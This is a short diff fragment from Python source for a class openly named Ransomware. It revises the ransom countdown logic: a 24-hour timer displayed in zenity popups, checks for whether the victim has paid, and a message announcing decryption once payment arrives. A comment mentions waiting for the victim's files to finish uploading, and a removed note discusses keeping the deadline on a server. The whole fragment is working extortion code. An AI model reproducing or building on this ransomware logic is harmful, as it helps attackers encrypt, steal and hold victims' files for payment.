@@ -268,11 +268,10 @@ class Ransomware:
         t1.start()
 
 
-        #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
-        # again its still the same. Alternatively mayb we tell them not to close their computer?
+
 
         start_time = time.time()
-        remaining_time = 86400
+        remaining_time = 86400 #24 hours 
 
 
 
@@ -281,7 +280,6 @@ class Ransomware:
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
             seconds = int(remaining_time % 60)
-
 
 
 
@@ -297,12 +295,10 @@ class Ransomware:
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
-            if (self.check_if_user_has_paid()):
-                break
 
 
         #User has paid before the time ran out
-        if (ransomware.check_if_user_has_paid()):
+        if (self.check_if_user_has_paid()):
             # Waits until all the files has been uploaded before processing the payment
             t1.join()
             popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
